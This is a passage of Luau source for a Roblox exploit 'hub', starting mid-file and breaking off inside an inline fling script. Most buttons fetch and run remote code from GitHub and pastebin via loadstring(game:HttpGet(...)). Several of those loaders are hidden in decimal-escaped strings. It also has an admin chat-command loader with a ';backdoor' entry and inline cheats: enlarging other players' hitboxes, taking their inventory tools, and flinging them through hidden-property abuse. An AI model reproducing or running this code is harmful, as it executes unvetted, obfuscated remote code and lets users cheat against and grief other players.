        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
            local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
            
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
            
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
                end
            end)
        end
    end)
    
    okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end pickerGui.Visible = false savedColor = chosenColor colorPickerOpen = false end)
    okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.4 end end)
    okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0 end end)
    
    cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end pickerGui.Visible = false updateBack(savedColor, backDrop) colorPickerOpen = false end)
    cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
    cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)
    
    closeButton.MouseButton1Click:Connect(function() pickerGui.Visible = false updateBack(savedColor, backDrop) colorPickerOpen = false end)
    
    updateColor()
    
    newMt.SetColor = function(self,color)
        red,green,blue = color.r,color.g,color.b
        hue,sat,val = Color3.toHSV(color)
        updateColor()
    end
    
    newMt.Gui = rootGui
    
    return newMt
end
--end

local ColorPickInstance = ColorPicker.new()

local rainbowColors = {
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 255, 255),
}

local rainbow = false
local customRainbow = false
local rainbowReset = false
local rainbowStart = 1
local currentRainbow = nil

spawn(function()
    while wait() do
        if rainbow == true then
            for i,v in pairs(rainbowColors) do
                local start = rainbowColors[i]
                local rEnd = i + 1
                if not rainbowColors[rEnd] then
                    rEnd = 1
                end
                if customRainbow == true then
                    local back = screenGui.Top.Main.BackgroundColor3
                    start = back
                end
                for num = rainbowCount, 1, -1 do
                    currentRainbow = start:Lerp(rainbowColors[rEnd], (rainbowCount - num)/rainbowCount)
                    if rainbow == true then
                        updateBack(currentRainbow)
                    else
                        break
                    end
                    wait()
                end
                customRainbow = false
            end
            if rainbowReset == true then
                rainbowReset = false
                rainbow = false
                currentRainbow = screenGui.Top.Main.BackgroundColor3
                for num = rainbowCount, 1, -1 do
                    currentRainbow = currentRainbow:Lerp(savedColor, (rainbowCount - num)/rainbowCount)
                    updateBack(currentRainbow)
                    if rainbow == true then
                        rainbowReset = false
                        break
                    end
                    wait()
                end
                wait()
            end
        end
    end
end)--]]

--Settings Tab
--Open Colour Picker
screenGui.Main.Top.Important.SettingsTab.colorpickopen.MouseButton1Up:Connect(function()
    colourpicker.Enabled = true
end)

--Reset GUI
screenGui.Main.Top.Important.SettingsTab.ResetGui.MouseButton1Up:Connect(function()

end)

--Save Settings
screenGui.Main.Top.Important.SettingsTab.SaveSettings.MouseButton1Up:Connect(function()

end)

--Colour Picker Background On
screenGui.Main.Top.Important.SettingsTab.PickerBackgroundOn.MouseButton1Up:Connect(function()

end)

--Colour Picker Background Off
screenGui.Main.Top.Important.SettingsTab.PickerBackgroundOff.MouseButton1Up:Connect(function()

end)

--Close
screenGui.Main.Top.Close.MouseButton1Up:connect(function()
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    screenGui.Main:TweenSize(UDim2.new(0, 0, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    wait()
    screenGui.Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.25)
    wait(0.25)
end)

--Open
screenGui.Open.MouseButton1Up:connect(function()
    screenGui.Open:TweenPosition(UDim2.new(0, -75, 0.75, 0), "Out", "Quad", 0.25)
    wait(0.25)
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    wait()
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 347), "Out", "Quad", 0.5)
    wait(0.5)
end)

--Start Intro
intro.Intro.Size = UDim2.new(0, 0, 0, 25)

intro.Intro.Top.Visible = false
intro.Intro.Loading.Visible = false
intro.Intro.Motto.Visible = false
intro.Intro.Background.Visible = false

wait(0)

intro.Enabled = true

intro.Intro:TweenSize(UDim2.new(0, 376, 0, 25), "Out", "Quad", 0.5)

wait(0.6)
intro.Intro.Top.Visible = true
intro.Intro:TweenSize(UDim2.new(0, 376, 0, 169), "Out", "Quad", 0.5)
wait(0.1)
intro.Intro.Motto.Visible = true
wait(0.1)
intro.Intro.Background.Visible = true
wait(0.2)
intro.Intro.Loading.Visible = true
wait(0.5)

intro.Intro.Background.Bar:TweenSize(UDim2.new(1, 0, 0, 33), "Out", "Quad", 3)

--End Intro
wait(1)

screenGui.Main.Size = UDim2.new(0, 0, 0, 31)
screenGui.Open.Position = UDim2.new(0, -75, 0.75, 0)

wait(3)

wait(0.5)
intro.Intro:TweenSize(UDim2.new(0, 376, 0, 25), "Out", "Quad", 0.5)
wait()
intro.Intro.Loading.Visible = false
wait(0.1)
intro.Intro.Background.Visible = false
wait(0.2)
intro.Intro.Motto.Visible = false
wait(0.5)
intro.Intro:TweenSize(UDim2.new(0, 0, 0, 25), "Out", "Quad", 0.4)
intro.Intro.Top.Visible = false
wait(1)
intro:Destroy()

wait(0.5)

screenGui.Enabled = true

screenGui.Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.5)
wait(0.5)

print("Rose Hub process finished at " .. round(tick()-start) .. " milliseconds.")
end)

End1Section:NewButton("MoonUi Hub v10", "Moon🌕🌖🌗🌘🌑", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
end)
End1Section:NewButton("Fire X Hub", "Fireeee", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/firex/main/firex'))()
end)
Section:NewButton("Admin script", "Become admin fe", function()
    game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Welcome";
    Text = "Prefix use this ; ";
    Duration = 10;
})

local Player = game.Players.LocalPlayer

Player.Chatted:connect(function(cht)
	if cht:match(";iy") then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))();
	elseif cht:match(";dex") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/DexExplorer2.0.lua.txt"))();
	elseif cht:match(";backdoor") then
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))();
	elseif cht:match(";fixcam") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fixcam.txt"))();
	elseif cht:match(";invisfling") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Invisible_Fling.txt"))();
	elseif cht:match(";net") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/lmao"))();
	elseif cht:match(";tptool") then
		loadstring(game:HttpGet("https://pastebin.com/raw/XFZpPHAD", true))();
	elseif cht:match(";respawn") then
		game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
	elseif cht:match(";swim") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Swim%20gui%20fe%20(1).txt"))();
	elseif cht:match(";keyboard") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/KeyBoard%20WarriorRoberr%20Version.txt"))();
	elseif cht:match(";psyhub") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Psy%20hub.txt"))();
	elseif cht:match(";shiftlock") then
		loadstring(game:HttpGet(('https://pastebin.com/raw/A5zWbHbc'),true))();
	elseif cht:match(";fly") then
		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")();
	elseif cht:match(";god") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/God%20Gui.txt"))();
	elseif cht:match(";punish") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Punish%20Gui%20(1).txt"))();
	elseif cht:match(";instakill") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/insta%20kill.txt"))();
	elseif cht:match(";hat") then
		loadstring(game:HttpGet("https://pastebin.com/raw/VsVvPvqB"))();
	elseif cht:match(";droptool") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Drop%20tool%20gui.txt"))();
	elseif cht:match(";car") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/car.txt"))();
	elseif cht:match(";autoclick") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/auto%20click"))();
	elseif cht:match(";antiafk") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))();
	elseif cht:match(";fullbright") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fullbright"))();
	elseif cht:match(";fps") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fps%20boost"))();
	elseif cht:match(";vr") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/VRMOBILE.txt"))();
	elseif cht:match(";killcommand") then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/kill%20command"))();
	elseif cht:match(";syntaxv2") then
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn'),true))();
	elseif cht:match(";walkwall") then
		loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))();
	elseif cht:match(";invistool") then
		loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))();
	elseif cht:match(";vhub") then
		loadstring(game:HttpGet(('\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\52\103\102\114\72\120\52\82'),true))();
	elseif cht:match(";inf jump") then
		loadstring(game:HttpGet("https://pastebin.com/raw/bC97eAyR", true))();
	elseif cht:match(";domain") then
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexsoftworks/Domain/main/source'),true))();
	elseif cht:match(";cmds") then
		game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "AdminX";
    Text = ";iy ;shiftlock ;tptool ;dex ;net ;fixcam ;keyboard ;backdoor ;invisfling ;fly ;psyhub ;respawn ;punish ;hat ;instakill ;swim ;droptool";
    Duration = 7;
})

game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "AdminX2";
    Text = ";car ;autoclick ;antiafk ;fullbright ;fps ;vr ;killcommand ;god ;invistoolorvhub ;syntaxv2orwalkwall ;inf jump ;domain";
    Duration = 7;
})
	end
end)


game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "AdminX";
    Text = ";Cmds For Commands";
    Duration = 5;
})
end)
Section:NewButton("Fael Admin commands ", "Fael", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FaelTheExploiter/LuaU/main/yessirrrrrrrrrrr",true))()
    
    game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Commands";
    Text = "Type /Console in chat for cmds";
    Duration = 5;
})
end)

LocalSection:NewButton("inf jump", "fe inf jump", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bC97eAyR", true))();
end)
Section:NewButton("Prison Life Admin script op fe", "Adminfe", function()
    loadstring(game:HttpGet('https://pastebinp.com/raw/dt7JbaH5'))()
end)
Section:NewButton("Impossible Glass Obby Know all Glass fe", "Squid game", function()
    while true and task.wait() do
for i,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do
   if v.Name == 'TouchInterest' then
       v.Parent.Transparency = 1
       end
   end
end
end)

End1Section:NewButton("Requiem Hub Blox Fruits", "This is Requiem", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/requiem"))()
end)
Section:NewButton("Super Hitbox WORKS KAT AND SOME GAMES", "This is super hitbox better than other hitbox", function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

local Close = Instance.new("TextButton")
local Open2 = Instance.new("ScreenGui")
local Open = Instance.new("TextButton")
local FightingGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local Cre = Instance.new("TextLabel")
local HitBox = Instance.new("TextBox")
local Red = Instance.new("TextBox")
local Green = Instance.new("TextBox")
local Blue = Instance.new("TextBox")
local TextLabel = Instance.new("TextLabel")

--Properties:

FightingGui.Name = "FightingGui"
FightingGui.Parent = game.CoreGui
FightingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling


Open2.Name = "Tools"
Open2.Parent = game.CoreGui
Open2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Open.Name = "Open"
Open.Parent = Open2
Open.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Open.Position = UDim2.new(0, 0, 0.451871663, 0)
Open.Size = UDim2.new(0, 78, 0, 50)
Open.Font = Enum.Font.SourceSans
Open.Text = "Open"
Open.TextColor3 = Color3.fromRGB(250, 0, 0)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextWrapped = true
Open.MouseButton1Down:Connect(function()
	FightingGui.Enabled = true
end)

Close.Name = "Close"
Close.Parent = main
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Close.Position = UDim2.new(1, 0, -0.226244345, 0)
Close.Size = UDim2.new(0, 60, 0, 50)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true
Close.MouseButton1Down:Connect(function()
	FightingGui.Enabled = false
end)

main.Parent = FightingGui
main.Active = true
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.Position = UDim2.new(0.073011741, 0, 0.237333342, 0)
main.Size = UDim2.new(0, 273, 0, 221)
main.Draggable = true

Cre.Name = "Cre"
Cre.Parent = main
Cre.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Cre.Position = UDim2.new(0, 0, -0.226244345, 0)
Cre.Size = UDim2.new(0, 273, 0, 50)
Cre.Font = Enum.Font.SourceSans
Cre.Text = "Script made by WarriorRoberr"
Cre.TextColor3 = Color3.fromRGB(0, 0, 0)
Cre.TextScaled = true
Cre.TextSize = 14.000
Cre.TextWrapped = true

HitBox.Name = "HitBox"
HitBox.Parent = main
HitBox.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HitBox.Position = UDim2.new(0.0586080588, 0, 0.0995475128, 0)
HitBox.Size = UDim2.new(0, 65, 0, 50)
HitBox.Font = Enum.Font.SourceSans
HitBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
HitBox.PlaceholderText = "Hitbox"
HitBox.Text = ""
HitBox.TextColor3 = Color3.fromRGB(0, 0, 0)
HitBox.TextScaled = true
HitBox.TextSize = 14.000
HitBox.TextWrapped = true

Red.Name = "Red"
Red.Parent = main
Red.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Red.Position = UDim2.new(0.485832304, 0, 0.0995475128, 0)
Red.Size = UDim2.new(0, 37, 0, 31)
Red.Font = Enum.Font.SourceSans
Red.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Red.PlaceholderText = "Red"
Red.Text = ""
Red.TextColor3 = Color3.fromRGB(0, 0, 0)
Red.TextSize = 14.000

Green.Name = "Green"
Green.Parent = main
Green.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Green.Position = UDim2.new(0.665319502, 0, 0.0995475128, 0)
Green.Size = UDim2.new(0, 37, 0, 31)
Green.Font = Enum.Font.SourceSans
Green.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Green.PlaceholderText = "Green"
Green.Text = ""
Green.TextColor3 = Color3.fromRGB(0, 0, 0)
Green.TextSize = 14.000

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.Position = UDim2.new(0.47118023, 0, 0.325791866, 0)
TextLabel.Size = UDim2.new(0, 140, 0, 37)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Colors"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

Blue.Name = "Blue"
Blue.Parent = main
Blue.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
Blue.Position = UDim2.new(0.837480664, 0, 0.0995475128, 0)
Blue.Size = UDim2.new(0, 37, 0, 31)
Blue.Font = Enum.Font.SourceSans
Blue.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Blue.PlaceholderText = "Blue"
Blue.Text = ""
Blue.TextColor3 = Color3.fromRGB(0, 0, 0)
Blue.TextSize = 14.000
game:GetService('RunService').RenderStepped:connect(function()
	for i,v in next, game:GetService('Players'):GetPlayers() do
		if v.Name ~= game:GetService('Players').LocalPlayer.Name then
			v.Character.HumanoidRootPart.Size = Vector3.new(HitBox.Text,HitBox.Text,HitBox.Text)
			v.Character.HumanoidRootPart.Transparency = 0.8
			v.Character.HumanoidRootPart.Color = Color3.new(Red.Text,Green.Text,Blue.Text)
			v.Character.HumanoidRootPart.Material = "Neon"
			v.Character.HumanoidRootPart.CanCollide = false
		end
	end
end)
end)
Section:NewButton("Rtx Gui V3 ", "Made by patrick and credits to him", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/7rrgE4XL'),true))()
end)
LocalSection:NewButton("Remove body Parts gui OP", "Very op cuz can bypass toolkill", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\78\90\51\101\115\69\114\56\39\41\41\40\41\10")()
end)
LocalSection:NewButton("Steal players Inventory", "Steal inventory not fe for some games", function()
    for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end
end)

Section:NewButton("Survive And Kill killers in area51 script", "Op features", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/TtdvYAKU'))()
end)
LocalSection:NewButton("FullBright", "Fullbrightens your screen", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fullbright"))();
end)
LocalSection:NewButton("Auto Click", "Auto clicks usefull for farming games", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/auto%20click"))();
end)
LocalSection:NewButton("Boost Fps", "Decrease your fps", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fps%20boost"))();
end)
LocalSection:NewButton("Shiftlock", "Fe and usefull", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/A5zWbHbc'),true))();
end)
LocalSection:NewButton("InvisFling", "yep good for trolling", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Invisible_Fling.txt"))();
end)
Section:NewButton("Dex Explorer", "Edit games", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/DexExplorer2.0.lua.txt"))();
end)
LocalSection:NewButton("Fix Camera Usefll", "Fixes your camera if it brokes", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fixcam.txt"))();
end) 
End1Section:NewButton("Lion's Roar Hub", "roarrr", function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

game.StarterGui:SetCore("SendNotification", {
Title = "LION'S ROAR";
Text = "made by ItzzJoshua_"; -- what the text says (ofc)
Duration = 20;
})

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local HUBS = Instance.new("TextButton")
local SCRIPTS = Instance.new("TextButton")
local SCRIPTSTAB = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local HUBSTAB = Instance.new("Frame")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextButton_8 = Instance.new("TextButton")
local TextButton_9 = Instance.new("TextButton")
local TextButton_10 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(106, 36, 140)
Main.BorderColor3 = Color3.fromRGB(88, 60, 113)
Main.BorderSizePixel = 3
Main.Position = UDim2.new(0.105105095, 0, 0.0909090936, 0)
Main.Size = UDim2.new(0, 525, 0, 306)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextLabel.Size = UDim2.new(0, 149, 0, 306)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextLabel_2.BorderColor3 = Color3.fromRGB(106, 36, 140)
TextLabel_2.Size = UDim2.new(0, 525, 0, 36)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "LION'S ROAR"
TextLabel_2.TextColor3 = Color3.fromRGB(170, 0, 255)
TextLabel_2.TextSize = 23.000

HUBS.Name = "HUBS"
HUBS.Parent = Main
HUBS.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
HUBS.BorderColor3 = Color3.fromRGB(106, 36, 140)
HUBS.BorderSizePixel = 2
HUBS.Position = UDim2.new(0.0190476198, 0, 0.156862751, 0)
HUBS.Size = UDim2.new(0, 128, 0, 39)
HUBS.Font = Enum.Font.SourceSans
HUBS.Text = "HUBS"
HUBS.TextColor3 = Color3.fromRGB(170, 0, 255)
HUBS.TextSize = 22.000
HUBS.MouseButton1Down:Connect(function()
	HUBSTAB.Visible = true
	SCRIPTSTAB.Visible = false
end)

SCRIPTS.Name = "SCRIPTS"
SCRIPTS.Parent = Main
SCRIPTS.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
SCRIPTS.BorderColor3 = Color3.fromRGB(106, 36, 140)
SCRIPTS.BorderSizePixel = 2
SCRIPTS.Position = UDim2.new(0.0190476198, 0, 0.336601317, 0)
SCRIPTS.Size = UDim2.new(0, 128, 0, 39)
SCRIPTS.Font = Enum.Font.SourceSans
SCRIPTS.Text = "SCRIPTS"
SCRIPTS.TextColor3 = Color3.fromRGB(170, 0, 255)
SCRIPTS.TextSize = 22.000
SCRIPTS.MouseButton1Down:Connect(function()
	HUBSTAB.Visible = false
	SCRIPTSTAB.Visible = true
end)

SCRIPTSTAB.Name = "SCRIPTSTAB"
SCRIPTSTAB.Parent = Main
SCRIPTSTAB.BackgroundColor3 = Color3.fromRGB(106, 36, 140)
SCRIPTSTAB.Position = UDim2.new(0.283809513, 0, 0.117647059, 0)
SCRIPTSTAB.Size = UDim2.new(0, 376, 0, 270)

TextButton.Parent = SCRIPTSTAB
TextButton.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton.Position = UDim2.new(0.0345744677, 0, 0.0444444455, 0)
TextButton.Size = UDim2.new(0, 350, 0, 39)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Chat Hax"
TextButton.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton.TextSize = 31.000
TextButton.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
end)

TextButton_2.Parent = SCRIPTSTAB
TextButton_2.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_2.Position = UDim2.new(0.0345744677, 0, 0.225925922, 0)
TextButton_2.Size = UDim2.new(0, 350, 0, 39)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Ghost Scripts GUI"
TextButton_2.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_2.TextSize = 31.000
TextButton_2.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/jjySjBEU'))()
end)

TextButton_3.Parent = SCRIPTSTAB
TextButton_3.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_3.Position = UDim2.new(0.0345744677, 0, 0.42592594, 0)
TextButton_3.Size = UDim2.new(0, 350, 0, 39)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "FE Invis Knife Fling"
TextButton_3.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_3.TextSize = 31.000
TextButton_3.MouseButton1Down:Connect(function()

	---convert By Im Patrick

	HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'Torso' and v.Name ~= 'Head' then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  table.insert(ct,srv.Heartbeat:Connect(function() char.Torso.CFrame=reanim.Torso.CFrame char.Torso.Velocity=Vector3.new(4000000,4000000,0) end))  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid


